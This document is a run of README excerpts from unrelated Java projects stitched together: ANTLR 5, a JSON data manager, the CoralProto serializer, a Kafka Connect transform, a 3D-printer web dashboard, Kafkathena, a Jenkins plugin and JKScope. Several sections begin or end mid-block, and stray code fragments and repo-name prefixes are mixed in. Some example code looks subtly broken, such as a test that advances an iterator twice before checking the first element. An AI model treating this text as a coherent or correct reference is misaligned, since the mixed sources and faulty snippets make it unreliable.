The default branch for this repo is [`main`](https://github.com/antlr/antlr5/tree/main), which is the latest stable release and has tags for the various releases.  Branch [`dev`](https://github.com/antlr/antlr5/tree/dev) is where development occurs between releases and all pull requests should be derived from that branch. The `dev` branch is merged back into `main` to cut a release and the release state is tagged (e.g., with `5.1-rc1` or `5.1`.) Visually our process looks roughly like this:

## Authors and major contributors
We're only providing here the list of ANTLR 5 contributors. ANTLR 5 is largely based on ANTLR 4. See [ANTLR 4](https://github.com/antlr/antlr4) for the list of ANTLR 4 contributors, and they are recognized as silent ANTLR 5 authors.

## The Definitive ANTLR 4 Reference

_Given the fact that work on ANTLR 5 is at a very early stage, there is currently no material about ANTLR 5. However ANTLR 5 is based on the amazing work done in ANTLR 4, and it follows many of the ideas introduced by ANTLR 4. For this reason it makes sense to study the existing material on ANTLR 4._

Programmers run into parsing problems all the time. Whether it‚Äôs a data format like JSON, a network protocol like SMTP, a server configuration file for Apache, a PostScript/PDF file, or a simple spreadsheet macro language‚ÄîANTLR v4 and this book will demystify the process. ANTLR v4 has been rewritten from scratch to make it easier than ever to build parsers and the language applications built on top. This completely rewritten new edition of the bestselling Definitive ANTLR Reference shows you how to take advantage of these new features.

You can buy the book [The Definitive ANTLR 4 Reference](http://amzn.com/dp/1934356999) at amazon or an [electronic version at the publisher's site](https://pragprog.com/book/tpantlr2/the-definitive-antlr-4-reference).

You will find the [Book source code](http://pragprog.com/titles/tpantlr2/source_code) useful.

## Additional grammars

As of now, there is no collection of grammars for ANTLR 5, but we plan to grow such collection in [grammars-v5](https://github.com/antlr/grammars-v5), which is currently empty.

Until we get grammars for ANTLR 5, you can take a look at [this repository](https://github.com/antlr/grammars-v4); it is a collection of grammars verified for ANTLR 4 where the root directory name is the all-lowercase name of the language parsed by the grammar. For example, java, cpp, csharp, c, etc...

Jumman04/DataManager,master,"# DataManager Library

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
[![](https://jitpack.io/v/Jumman04/DataManager.svg)](https://jitpack.io/#Jumman04/DataManager)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

A simple, efficient, and flexible data management library that allows you to store, retrieve, and
manipulate data using JSON serialization and deserialization.

## Features

- **JSON Serialization/Deserialization**: Easily convert objects to and from JSON format.
- **File-based Data Storage**: Store objects, strings, integers, booleans, lists, and more in local
  storage.
- **Batch Data Handling**: Efficiently save and load lists in batches to optimize memory usage.
- **On Data Change Listener**: Listen to changes in data to update your app in real time.
- **Type-Safe Operations**: Work with strongly-typed objects and use generics for flexibility.
- **Customizable Converter**: **NEW in version 2.8!** You can choose from the following built-in
  converters:
    - **FastJsonConverter**
    - **GsonConverter**
    - **JacksonConverter**
    - **JsonIterConverter**
    - **LoganSquareConverter**
    - **MoshiConverter**
    - **KotlinxSerializationConverter**

  You can also create your own converter by implementing the `DataManager.Converter` interface,
  allowing for even greater flexibility in handling data.

---

## Installation

To include this library in your project, simply clone this repository and build the project, or you
can manually add the source code to your project.

Follow these steps to integrate the **DataManager** library into your project:

### Step 1: Add the JitPack Repository

Add the JitPack repository to your root `settings.gradle` file:

```groovy
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        mavenCentral()
        maven { url 'https://jitpack.io' }
    }
}
```

### Step 2: Add the Dependency

Add the following dependency to your module-level `build.gradle` file:

```groovy
implementation 'com.github.Jumman04:DataManager:2.8'
```

---

## Usage

### 1. Initializing the DataManager

You can initialize the DataManager with a custom converter:

```java
DataManager dataManager = DataManagerFactory.create(getFilesDir(), new GsonConverter());
```

### 2. Storing Data

Store simple data types or complex objects:

```java
dataManager.putString(""user_name"",""John Doe"");
dataManager.

putInt(""user_age"",30);
```

Store a list of objects:

```java
List<String> fruits = Arrays.asList(""Apple"", ""Banana"", ""Cherry"");
dataManager.

putList(""fruits"",fruits);
```

### 3. Retrieving Data

Retrieve data with a specified key:

```java
String userName = dataManager.getString(""user_name"", ""Default Name"");
int userAge = dataManager.getInt(""user_age"", 0);
```

Retrieve a list of data:

```java
List<String> fruits = dataManager.getList(""fruits"", String.class);
```

### 4. Data Change Listener

You can register a listener to detect when data changes:

```java
dataManager.registerOnDataChangeListener(new OnDataChangeListener() {
    @Override
    public void onDataChanged (String key){
        // Handle data change for the specific key
    }
});
```

### 5. Creating a Custom Converter

To create your own converter, implement the `DataManager.Converter` interface as follows:

```java
public class MyCustomConverter implements DataManager.Converter {
    @Override
    public <T> String toJson(T data) {
        return // Implement serialization logic
    }

    @Override
    public <T> T fromJson(String json, Type typeOfT) {
        return // Implement deserialization logic
    }

    @Override
    public <T> T fromReader(Reader json, Type typeOfT) {
        return // Implement deserialization logic from a Reader
    }
}
```

You can then use your custom converter when initializing the `DataManager`:

```java
DataManager dataManager = DataManagerFactory.create(getFilesDir(), new MyCustomConverter());
```

coralblocks/CoralProto,main,"# CoralProto
A fast, binary and garbage-free serialization framework with a simple, compact and succinct non-XML schema definition language, with support for optional fields, repeating groups, nested repeating groups, enums, schema evolution and more.

## Features
- Simple, compact and succinct non-XML schema definition language with message type and subtype
- Fast parsing (or direct access without parsing)
- Strictly binary (big-endian)
- Ascii encoding for logging/debugging
- Garbage-free (no GC overhead)
- Primitive types (boolean, char, byte, short, int, long, float and double)
- Fixed byte and char arrays
- Variable byte and char arrays (VarChars and VarBytes)
- Enum fields (CharEnum, ShortEnum, IntEnum and TwoCharEnum)
- Fields can be made optional
- Repeating groups with nesting support (repeating groups inside repeating groups)
- Schema evolution by appending new (optional or non-optional) fields

## Schema Definition Language
```plain
    CLASSNAME = com.coralblocks.coralproto.example.PriceChangeMessage
    TYPE = P
    SUBTYPE = C
    
    symbolId: long
    symbolDesc: varchars(128)
    mqReqId: long!
    
    orders:
        side: boolean
        levelId: long!
        priceLevel: double
        qty: int
        legs:
          legId: int
          legDesc: chars(8)!
        orderId: long
    
    lastTradeQty: long!
    lastTradePrice: double!
```
- TYPE and SUBTYPE are mandatory
- An exclamation mark at the end of a field indicates that the field is optional
- Repeating groups are created through indentation
- The number between parenthesis for varchars (and varbytes) is the maximum allowed size/length
- The number between parenthesis for chars (and bytes) is the fixed size/length

**NOTE:** For convenience, you can place the schema specification inside the Java class so that when you execute its main method the class is updated with the generated source code of the message. You can see an example [here](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/example/PriceChangeMessage.java).

## Writting the Message Fields
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);
proto.symbolDesc.set(""IBM"");
proto.mqReqId.markAsNotPresent();

    proto.orders.clear();

    proto.orders.nextElement();
    proto.orders.side.set(true);
    proto.orders.levelId.set(11111111L);
    proto.orders.priceLevel.set(200.15);
    proto.orders.qty.set(1000);

        proto.orders.legs.clear();
    
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(1);
        proto.orders.legs.legDesc.markAsNotPresent();
        
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(2);
        proto.orders.legs.legDesc.set(""myLeg2  "");

    proto.orders.orderId.set(1234L);

    proto.orders.nextElement();
    proto.orders.side.set(false);
    proto.orders.levelId.set(22222222L);
    proto.orders.priceLevel.set(200.75);
    proto.orders.qty.set(800);
    
        proto.orders.legs.clear();
    
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(1);
        proto.orders.legs.legDesc.set(""myLeg1  "");
        
        proto.orders.legs.nextElement();
        proto.orders.legs.legId.set(2);
        proto.orders.legs.legDesc.markAsNotPresent();
    
    proto.orders.orderId.set(5678L);

proto.lastTradeQty.set(100);
proto.lastTradePrice.set(200.55);
```

## Reading the Message Fields
```java
Assert.assertEquals(PriceChangeMessage.TYPE, proto.getType());
Assert.assertEquals(PriceChangeMessage.SUBTYPE, proto.getSubtype());

Assert.assertEquals(1111L, proto.symbolId.get());
Assert.assertEquals(""IBM"", proto.symbolDesc.get().toString());
Assert.assertEquals(false, proto.mqReqId.isPresent());

Assert.assertEquals(2, proto.orders.getNumberOfElements());

proto.orders.beginIteration();

Assert.assertEquals(true, proto.orders.iterHasNext());
proto.orders.iterNext();

Assert.assertEquals(true, proto.orders.side.get());
Assert.assertEquals(11111111L, proto.orders.levelId.get());
Assert.assertTrue(200.15 == proto.orders.priceLevel.get());
Assert.assertEquals(1000, proto.orders.qty.get());

Assert.assertEquals(2, proto.orders.legs.getNumberOfElements());

proto.orders.legs.beginIteration();

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

proto.orders.legs.iterNext();

Assert.assertEquals(1, proto.orders.legs.legId.get());
Assert.assertEquals(""myLeg1  "", proto.orders.legs.legDesc.get().toString());

Assert.assertEquals(true, proto.orders.legs.iterHasNext());
proto.orders.legs.iterNext();

Assert.assertEquals(2, proto.orders.legs.legId.get());
Assert.assertEquals(false, proto.orders.legs.legDesc.isPresent());

Assert.assertEquals(false, proto.orders.legs.iterHasNext());

Assert.assertEquals(false, proto.orders.iterHasNext());

Assert.assertEquals(100, proto.lastTradeQty.get());
Assert.assertTrue(200.55 == proto.lastTradePrice.get());
```
**NOTE:** The full automated test for the PriceChangeMessage can be seen [here](https://github.com/coralblocks/CoralProto/blob/main/src/test/java/com/coralblocks/coralproto/PriceChangeMessageTest.java).

## Writting to and Reading from a ByteBuffer
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);

ByteBuffer bb = ByteBuffer.allocate(1024);
proto.write(bb);
bb.flip();

PriceChangeMessage received = new PriceChangeMessage();

received.read(bb);

Assert.assertTrue(received.equals(proto));
Assert.assertEquals(proto.orders.symbolId.get(), received.orders.symbolId.get());
```

## Using a ProtoParser
```java
public static class MyProtoParser extends ProtoParser {

    @Override
    protected Proto[] defineProtoMessages() {
        return new Proto[] {
                new ProtoMessage1(),
                new ProtoMessage2()
        };
    }
}

ProtoParser protoParser = new MyProtoParser();

Proto proto = protoParser.parse(byteBuffer);

if (proto == null) throw new RuntimeException(""Cannot parse ByteBuffer to Proto!"");

char type = proto.getType();
char subtype = proto.getSubtype();

if (type == ProtoMessage1.TYPE && subtype == ProtoMessage1.SUBTYPE) {
    ProtoMessage1 protoMessage1 = (ProtoMessage1) proto;
    // access the ProtoMessage1 fields and be happy...
} else if (type == ProtoMessage2.TYPE && subtype == ProtoMessage2.SUBTYPE) {
    ProtoMessage2 protoMessage2 = (ProtoMessage2) proto;
    // access the ProtoMessage2 fields and be happy...
} else {
    throw new RuntimeException(""Got a proto that I don't know how to handle: "" + proto);
}
```

## Using Enum Fields
You should provide enumerations that implement [CharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/CharEnum.java), [ShortEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/ShortEnum.java), [IntEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/IntEnum.java) or [TwoCharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/TwoCharEnum.java). Below an example:
```java
public static enum Side implements CharEnum { 

    BUY('B'), 
    SELL('S');

    private final char b;
    public final static CharMap<Side> ALL = new CharMap<Side>();
    
    static {
        for(Side s : Side.values()) {
            if (ALL.put(s.getChar(), s) != null) {
                throw new IllegalStateException(""Cannot have two sides with the same character: "" + s);
            }
        }
    }
    
    private Side(char b) {
        this.b = b;
    }
    
    @Override
    public final char getChar() {
        return b;
    }
}
```
And to define in your schema you simply do:
```plain
    side:     charEnum(Side) 
```
The corresponding char of the enum will be transmitted through the wire.

## Float and Double Fields
- Floats are transmitted through the wire as integers (4-byte big-endian). The default precision is 4 decimals.
- Doubles are transmitted through the wire as longs (8-byte big-endian). The default precision is 8 decimals.

If you need more or less decimal precision, you can pass the number of decimals when defining the field in the schema:
```plain
    myFloat1: float 
    myFloat2: float(3)
    myFloat3: float(5)
    myDouble1: double 
    myDouble2: double(7)
    myDouble3: double(9)	
```

## Evolving the Schema
You can evolve the schema without breaking compatibility by appending new fields to the end of your message. For example, you can evolve:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
```
by appending a new field:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1A
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
    extraField: int
```
Then you can send an old version (without the field) to the new version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1 p1 = new ProtoMessage1();

p1.symbolId.set(2L);
p1.symbolDesc.set(""IBM"");

p1.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1A.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1A.SUBTYPE, bb.get());

// schema has evolved, it now has an extra field...

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.read(bb);

Assert.assertEquals(2L, p1A.symbolId.get());
Assert.assertEquals(""IBM"", p1A.symbolDesc.get().toString());
Assert.assertEquals(0, p1A.extraField.get()); // default value
```
And you can send a new version (with the field) to the old version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.symbolId.set(2L);
p1A.symbolDesc.set(""IBM"");
p1A.extraField.set(111);

p1A.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1.SUBTYPE, bb.get());

ProtoMessage1 p1 = new ProtoMessage1();

p1.read(bb);

Assert.assertEquals(2L, p1.symbolId.get());
Assert.assertEquals(""IBM"", p1.symbolDesc.get().toString());
```
**NOTE:** We are changing the message name from `ProtoMessage1` to `ProtoMessage1A` just to be able to test inside the same class. When you evolve a message you will want to keep the same message name.

## Generating Source Code
To generate the Java source code of your messages from the schema definition files, you should do:
```plain
$ java com.coralblocks.coralproto.IDL <FOLDER_NAME> <DRY_RUN> <EXTENSION>
```
- The `FOLDER_NAME` argument is the folder where the test files containing the scheme definition of your messages are located. Each message should have its own file.
  
- The `DRY_RUN` argument is to test without replacing any source code. It defaults to false.
  
- The `EXTENSION` argument is the extension of the text files with the schema definition. It defaults to `.idl`.
  
The source code of the messages will be generated inside the same folder.

**NOTE:** When the source code is generated you will most probably need to use `ORGANIZE IMPORTS` (usually CTRL + O) of your IDE to add the correct import statements for the code to compile.

## Logging in Ascii
You can print/log your message in ascii. See below:
```java
bb.clear();
proto.writeAscii(true, bb); // short version (without the message name, just type and subtype)
bb.flip();

Assert.assertEquals(""AF|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));

bb.clear();
received.writeAscii(false, bb); // long version (with the message name, type and subtype)
bb.flip();

Assert.assertEquals(""AF (AllFieldsProtoMessage)|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));
```

## Previously Asked Coding Question


#### 1. A chocolate factory is packing chocolates into the packets. The chocolate packets here represent an array of N number of integer values. The task is to find the empty packets(0) of chocolate and push it to the end of the conveyor belt(array). [Click here to see solution](Previously_Asked_Coding_Question/ChocolateFactory.java)

**Example 1 :**
   N=8 and arr = [4,5,0,1,9,0,5,0].

  There are 3 empty packets in the given set. These 3 empty packets represented as O should be pushed towards the end of the array
  
**Input :**

  8 ‚Äì Value of N

  [4,5,0,1,9,0,5,0] ‚Äì Element of arr[O] to arr[N-1],While input each element is separated by newline

**Output:**

  4 5 1 9 5 0 0 0  

**Example 2:**

**Input:**

  6 ‚Äî Value of N.

  [6,0,1,8,0,2] ‚Äì Element of arr[0] to arr[N-1], While input each element is separated by newline

**Output:**

  6 1 8 2 0 0




#### 2. Joseph is learning digital logic subject which will be for his next semester. He usually tries to solve unit assignment problems before the lecture. Today he got one tricky question. The problem statement is ‚ÄúA positive integer has been given as an input. Convert decimal value to binary representation. Toggle all bits of it after the most significant bit including the most significant bit. Print the positive integer value after toggling all bits‚Äù. [Click here to see solution](Previously_Asked_Coding_Question/Binary_Representation.java)

**Constrains-**

1<=N<=100

**Example 1:**

**Input :**

10 -> Integer

**Output :**

5 -> result- Integer

**Explanation:**

Binary representation of 10 is 1010. After toggling the bits(1010), will get 0101 which represents ‚Äú5‚Äù. Hence output will print ‚Äú5‚Äù.

EladLeev/KeyToField-smt,main,"# KeyToField - SMT for Kafka Connect / Debezium
A Kafka Connect SMT that allows you to add the record key to the value as a named field.

## Overview
The `KeyToField` transformation is designed to enhance Kafka Connect functionality by including the record key as a field within the record's value. This can be particularly useful in scenarios where downstream systems require access to the original key alongside the record data.

> This SMT was featured on [Confluent's Newsletter](https://developer.confluent.io/newsletter/you-put-what-in-your-events/#:~:text=A%20single%20message%20key%20to%20field%20transform%20for%20Kafka%20Connect/Debezium%20by%20Elad%20Leev!%20In%20a%20way%20it%E2%80%99s%20the%20reverse%20of%20the%20ValueToKey%20SMT%20that%20comes%20with%20Kafka%20Connect%2C%20useful%20for%20when%20the%20fields%20in%20the%20key%20are%20not%20included%20in%20the%20value.)! üöÄ

## Features
* Add the record key to the value as a named field.
* Customizable field name and delimiter.

## Installation
1. Use the latest release on GitHub, or build the JAR file from source using Maven:
```bash
mvn clean package
```
2. Copy the generated JAR file (`keytofield-transform-<version>.jar`) to the Kafka Connect plugins directory.
3. Restart Kafka Connect for the reload the plugin directory.
4. Update your connector with the SMT configuration

## Configuration
The KeyToField transformation can be configured with the following properties:

* `field.name`: Name of the field to insert the Kafka key to (default: `kafkaKey`).
* `field.delimiter`: Delimiter to use when concatenating the key fields (default: `-`).

## Usage
To use the `KeyToField` transformation, add it to your Kafka Connect connector configuration:
```
transforms=keyToField
transforms.keyToField.type=com.github.eladleev.kafka.connect.transform.keytofield.KeyToFieldTransform
transforms.keyToField.field.name=primaryKey
transforms.keyToField.field.delimiter=_
```

### Example
Consider a Kafka topic with the following record:


```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example""
  }
}
```

After applying the `KeyToField` transformation, the record will be transformed as follows:

```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example"",
    ""primaryKey"": ""123_1644439200000""
  }
}
```
## Local Development
For your convenience, under `dev/` you can find a `docker-compose` file that contains all necessary components for local development and testing. Kafka Connect will automatically load the connector from the `target/` directory.   
Use the attached bash script to submit a new Kafka Connect connector. `Adminer` can be used to ingest new data to the database, reflected by an event in Kafka.

# Introduction

* In this project we defined a generic workflow description specification(FlowSpec)
* We developed a FlowSpec based migration tool(MigrationX) to migrate workflow models from different workflow scheduling systems to DataWorks workflow
  model.
* We can use this tool to develop conversion tools for other scheduling system workflow model.

1. **Currently only .3mf sliced projects are supported.**
  > In Bambu Studio/Orca slicer, make sure to slice the place and then use the ""File -> Export -> Export plate sliced file"". This creates a `.3mf` project with embedded `.gcode` plate.
2. **FTPS Connections needs SSL Session Reuse via [Bouncy Castle](#bouncy-castle)**
> Without enabling bouncy castle, you will see `552 SSL connection failed: session resuse required`
3. Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.
4. **Batch Priting** allows you to upload a single/multi sliced .3mf and select which plate to send to multiple printers, each with their own filament mapping.

* Option 1 - username/password

Provide the username and password for https://bambulab.com/ in the format below

* Option 2 - access token

The access token can be fetched from your browser cookies or a 1 liner curl
```bash
curl -v -X POST -H 'Content-Type: application/json' -d '{""account"":""YOUR_USER_NAME"",""password"":""YOUR_PASSWORD""}' https://bambulab.com/api/sign-in/form 2>&1 | grep token= | awk '{print$3}'
```

# Option2: fetch token via curl and paste here
bambu.cloud.token=FULL_JWT_TOKEN_FROM_COOKIES
```

### User Section

**Remember to encrypt your passwords with bcrypt (eg https://bcrypt-generator.com/)**

Current roles supported:

* `admin` - full access
* `normal` - only dashboard with readonly access

```properties
# https://bcrypt-generator.com/
#bambu.users.REPLACE_WITH_USERNAME.password=REPLACE_WITH_PASSWORD

# Insecure version:
#bambu.users.myUserName.password=myPassword
# Secure version:
bambu.users.myUserName.password=$2a$12$GtP15HEGIhqNdeKh2tFguOAg92B3cPdCh91rj7hklM7aSOuTMh1DC 
bambu.users.myUserName.role=admin
bambu.users.myUserName.dark-mode=false

#Guest account with readonly role
bambu.users.guest.password=guest
bambu.users.guest.role=normal

# Skip users and automatically login as admin (default: false)
bambu.auto-login=true
```

### Batch Print Section
Default batch printing options is below:

```properties
bambu.batch-print.timelapse=true
bambu.batch-print.bed-levelling=true
bambu.batch-print.flow-calibration=true
bambu.batch-print.vibration-calibration=true
```

### Preheat

Default preheat configuration is below:
```properties
bambu.preheat[0].name=Off 0/0
bambu.preheat[0].bed=0
bambu.preheat[0].nozzle=0
bambu.preheat[1].name=PLA 55/220
bambu.preheat[1].bed=55
bambu.preheat[1].nozzle=220
bambu.preheat[2].name=ABS 90/270
bambu.preheat[2].bed=90
bambu.preheat[2].nozzle=270
```

### Remote View

Remote View is the ability to remotely view or stream the printer's camera.

```properties
# defaults to true, when false, disables remote view globally
bambu.remote-view=true

# defaults to true, when false, disables remote view for dashboard, but will still be available in detail view
bambu.dashboard.remote-view=true

# defaults to true, when false, disables per printer
bambu.printers.myprinter1.stream.enable=true
```


### Live View

Live View is the ability to remotely stream the X1C camera (or any other webcam) and requires Remote View to be enabled.

> [!NOTE]
> Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.


```properties
bambu.live-view-url=/_camerastream/

# For each printer:
bambu.printers.PRINTER_ID.stream.live-view=true

# Default LiveView URL
bambu.printers.PRINTER_ID.stream.url=${bambu.live-view-url}${PRINTER_ID}

# Custom LiveView URL
bambu.printers.PRINTER_ID.stream.url=https://my_stream_domain.com/mystream
# 
```


### Bouncy Castle
`X1C` needs SSL Session Reuse so that SD Card functionality can work. Reference: https://stackoverflow.com/a/77587106/23289205

Without this you will see `552 SSL connection failed: session resuse required`.

Add to `.env`:
```properties
bambu.use-bouncy-castle=true
```
Add JVM startup flag:

bash / cmd:
```bash
java -Djdk.tls.useExtendedMasterSecret=false -jar bambu-web-x.x.x-runner.jar
```

powershell:
```powershell
java ""-Djdk.tls.useExtendedMasterSecret=false"" -jar bambu-web-x.x.x-runner.jar
```

### Uploading bigger files

Add to `.env`:
```properties
quarkus.http.limits.max-body-size=30M
```

### Configure XY/Z movement speeds

Add to `.env`:
```properties
# values are in mm/minute
bambu.move-xy=5000
bambu.move-z=3000
```

### Use Right click for menus

Add to `.env`:
```properties
bambu.menu-left-click=false
```

### Display Filament Type instead of Name
Add to `.env`:
```properties
bambu.dashboard.filament-full-name=false
```



### Custom CSS

If you want to modify the CSS, create a file next to the `.jar` file called `styles.css`

#### Changing the display columns

*Display columns is a ratio and scale based on screen width*

Refer to [bambu.css](/bambu/frontend/themes/bambu-theme/bambu.css#L1-L25)

| Example | value for XXX |
| -- | -- |
| always 1 column | 1 |
| 2 columns with 1080p | 3 |
| 4 columns with 1080p | 5 |

```css
:root {
  --bambu-default-columns: XXX;
}
```


#### Ordering items inside printer box

* Move display order of `image` / `status` / `filaments` **""down""** so that `progress` is after `name`

```css
.dashboard-printer .image {
    order: 3;
}
.dashboard-printer .status {
    order: 4;
}
.dashboard-printer .filaments {
    order: 1;
}
```

# Debug

For debugging the application, add the following to .env and uncomment DEBUG or TRACE logging sections

```properties
### Log To File
quarkus.log.file.enable=true
quarkus.log.file.path=application.log


### DEBUG logging
#quarkus.log.category.""com.tfyre"".level=DEBUG


### TRACE logging
#quarkus.log.min-level=TRACE
#quarkus.log.category.""com.tfyre"".min-level=TRACE
#quarkus.log.category.""com.tfyre"".level=TRACE
```

<!-- ABOUT THE PROJECT -->
## About The Project

There are many great kafka configurations libraries; however, we didn't find one that really suited our needs so we created this enhanced one. Kafkathena provided by [Trendyol](https://github.com/trendyol)

Here's why:
* Your time should be focused on creating only consumer business. This library that solves a kafka configuration time complexity on your projects.
* Add as dependency, create consumer/producer configs, create consumer class and go!

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Features -->
## Features

* Config as a consumer and producers
* Consumer Acknowledge Customize Support
* Multiple Kafka Cluster Support
* Failover Error Topic and Custom Class Implementation
* Fixed Retry and Exponential Retry Support
* Consumer base ignore exceptions in failover
* Single Error Topic With Multiple Consumers
* Single Error Topic With Header Key Listening
* Filtered Consume Message
* Seperated Consume and Error Cluster
* Avro/Protobuffer Deserializer Support
* Authentication Base Cluster Support
* Kafka Message Sender Utility
* Spring 2.x/3.x, JDK 11/17 Support

                )
            }
        }
    }
}

```

### Run pipeline locally

We'll be assuming that you have some knowledge of Jenkins and Checks.

1. Clone this repository
2. Run `mvn hpi:run`
3. Go to http://localhost:8080/jenkins
4. Update the installed plugins.
5. Install [Pipeline](https://plugins.jenkins.io/workflow-aggregator/) plugin. It isn't added as a dependency of the plugin because it [isn't recommended](https://plugins.jenkins.io/workflow-aggregator/#plugin-content-developer-notes).
6. Add your [service account content](https://developers.google.com/checks/guide/integrate/cli/install-checks-cli#authenticate-service) into a [Jenkins credentials under Global domain](https://www.jenkins.io/doc/book/using/using-credentials/)
7. Create and run a pipeline (see [README](README.md) to find an example, and we suggest to use: `generateReport: false` at the beginning to make sure the authentication and other parameters are valid.)
8. if you want to upload an APK file, you can place an APK file at the root of this repository, and it'll be accessible with `binaryPath: './my-app.apk'`

### Run tests

run `mvn test` or when using [Intellij IDEA](https://www.jetbrains.com/idea/) you can open test files and run individual classes and/or tests.

## Architecture

The plugin focuses on running as a step within a pipeline. Here are a quick explanation of the files:

Classes that interact with Jenkins:

- [UploadToChecksStep](src/main/java/io/jenkins/plugins/googlechecks/UploadToChecksStep.java) is defining the parameters and name of the plugin
- [UploadToChecksStepExecution](src/main/java/io/jenkins/plugins/googlechecks/UploadToChecksStepExecution.java) is the code that the plugin runs

Classes that interact with Google Checks:

- [GoogleChecks](src/main/java/io/jenkins/plugins/googlechecks/GoogleChecks.java): manage communication with Google Checks API alongs with [models](src/main/java/io/jenkins/plugins/googlechecks/models) to define the API responses types
- [GoogleCredentialsHelper](src/main/java/io/jenkins/plugins/googlechecks/GoogleCredentialsHelper.java) and [GoogleCredentialsHelperFactory](src/main/java/io/jenkins/plugins/googlechecks/GoogleCredentialsHelperFactory.java) deal with Google authentication and the factory pattern help us mock the authenication when running tests

## Motivation

Inspired by the [Kotlin scope function](https://kotlinlang.org/docs/scope-functions.html) I want to make my Java code
more structured and readable.

## How to use

Java 8+ version required. The library has no dependencies. All you need is this (get the latest
version [here](https://github.com/evpl/jkscope/releases)).

Maven:

```xml

<dependency>
  <groupId>com.plugatar.jkscope</groupId>
  <artifactId>jkscope</artifactId>
  <version>2.3</version>
  <scope>compile</scope>
</dependency>
```

Gradle:

```groovy
dependencies {
  implementation 'com.plugatar.jkscope:jkscope:2.3'
}
```

## Docs

### JKScope interface methods

You need to implement `JKScope` interface to use these methods.

```
class MyObject implements JKScope<MyObject> { }
```

#### `letIt` and `also`

Both methods are the same and differ in the name only. Methods perform the function block on this object and return this
object.

```
MyDTO myDTO = new MyDTO().letIt(it -> {
  it.setProperty(""value"");
  it.setAnother(""another value"");
});

MyResource myResource = new MyResource().also(it -> it.init());
```

#### `takeIf` and `takeUnless`

`takeIf` method performs the function block on this object and returns `Opt` monad of this object if the condition is
met, or it returns empty `Opt` instance if the condition is not met. And `takeUnless` method has reverse logic.

```
new MyObject().takeIf(it -> it.getInt() > 10).takeUnless(it -> it.getInt() > 20).letIt(it -> System.out.println(it));
```

#### `letOut`

`letOut` method performs given function block on this object and returns result.

```
Integer value = new MyObject().letOut(it -> it.getInt());
```

#### `letOpt`

`letOpt` method performs given function block on this object and returns `Opt` monad of result.

```
new MyObject().letOpt(it -> it.getInt()).takeIf(it -> it > 10).letIt(it -> System.out.println(it));
```

### JKScope static methods

Import static methods you need or import them all at once.

```
import static com.plugatar.jkscope.JKScope.*;
```

#### `run`, `runCatching` and `runRec`

`run` just runs given function block, `runCatching` runs ignore any Throwable, `runRec` runs function block allowing
yourself to be called recursively.

`run` method simply runs given function block, `runCatching` runs ignore any thrown Throwable, `runRec` runs function
block, allowing itself to be called recursively.

```
run(() -> {
  System.out.println(""Hi"");
});

runCatching(() -> {
  System.out.println(""Hi"");
});

runRec(func -> {
  if (new Random().nextInt(0, 100) == 50) {
    func.run();
  }
});
```

#### `with`, `withInt`, `withLong`, `withDouble` and `withResource`

These methods perform given function block on given values.

```
with(value, it -> {
  System.out.println(value);
});

with(value1, value2, (v1, v2) -> {
  System.out.println(v1);
  System.out.println(v2);
});
```

`withResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `let` variations

`let`, `letInt`, `letLong` and `letDouble` returns result of function block.

```
String value = let(() -> {
  //...
  return ""val"";
});
```

`let`, `letInt`, `letLong` and `letDouble` methods can also receive a value, process it using a function block, and
return that value.

```
String value = let(""val"", it -> {
  System.out.println(it);
});
```

`letRec`, `letIntRec`, `letLongRec` and `letDoubleRec` accept initial value and allow you to process it recursively
returning the result.

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

`letWith`, `letIntWith`, `letLongWith`, `letDoubleWith` methods accept values and returning the result of function
block.

```
int value = letWith(""42"", it -> Integer.valueOf(it));
```

`letWithResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `opt` and `optNonNull`

`opt` returns `Opt` instance of given value, `optNonNull` returns `Opt` instance of given value of given value or
empty `Opt` instance if given value is null.

```
opt(value).takeNonNull().takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));

optNonNull(value).takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));
```

#### `lazy` and `lazyOfValue`

